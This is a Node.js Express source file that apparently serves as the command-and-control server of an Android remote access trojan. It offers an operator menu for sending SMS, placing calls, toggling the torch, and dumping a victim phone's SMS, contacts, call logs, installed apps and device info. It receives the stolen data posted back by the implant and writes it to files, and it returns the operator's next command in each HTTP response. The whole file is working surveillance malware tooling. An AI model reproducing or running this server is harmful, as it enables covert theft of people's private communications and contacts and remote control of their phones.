const loadingSpinner = require('loading-spinner');
const express=require("express");
const prom=require("prompt-sync");
const prompt=prom();
const app=express();
const fs=require("fs");
const bodyParser = require('body-parser');
//const cors = require('cors');
app.use(express.json());
//app.use(bodyParser.urlencoded({ extended: false }));
//app.use(bodyParser.json());
console.log("\033[93mCommands : \033[94m\n(1) [torch on/off] \n(2) [send_sms,number,text] \n(3) [call number] \n(4) [dump_sms] \n(5) [InstalledApps] \n(6) [dump_contact] \n(7) [get_phone_logs]    get call logs \n(8) [device_info]\033[0m")

var listeningSpnner = function(port) {
  console.log("\n\n\033[93mlisting "+port+"\n")
  process.stdout.write('\033[96mConnection ');

  loadingSpinner.start(300, {
    clearChar: true
  });

};

app.post("/",(req,res)=>{
	//console.log(req);
	if(req.body.data){
	console.log("\033[92m"+req.body.data)
	}else if(req.body.Info){
		const DeviceInfo=JSON.parse(req.body.Info);
		for(key in DeviceInfo){
			console.log("\033[92m"+key+"\033[0m : "+DeviceInfo[key]+"");
		}
	}
	else if(req.body.packages){
		const fileName=prompt("FILE NAME TO SAVE LIST : ");
		fs.writeFileSync(fileName,req.body.packages);
		console.log("SAVE TO : "+fileName);
	}
	//this is for contacts and callLogs
	else if(req.body.contact){
		const file=prompt("FILE NAME TO SAVE : ");
		if(file==""){
			//
		}else{
			fs.writeFileSync(file,"")
			fs.appendFileSync(file,req.body.contact);
			//console.log("\033[0m"+req.body.contact);
			console.log("\033[92mSAVE TO \033[0m "+file);
		}
	}

	//main response / commmand
	const response=prompt("\033[0m(\033[93m"+req.header('x-forwarded-for') +"\033[0m)\033[91m@\033[0m"+"\033[96mCommand \033[0m> ");
	res.status(200);
	res.send(response);
	
});
//app.post("/contact",(req,res)=>{
//	try{
//	const arr=new Array();
//	arr.push(req.body);
//	console.log(arr);
//	res.send("acc")
//	fs.appendFile("contacts.txt",req.body.contacts,(err)=>{if(err){console.log(err)}});
//	}catch(e){//console.log("40 contect imported process for more")
//	}
//});
var PORT=process.argv[2];
app.listen(PORT,listeningSpnner(PORT));
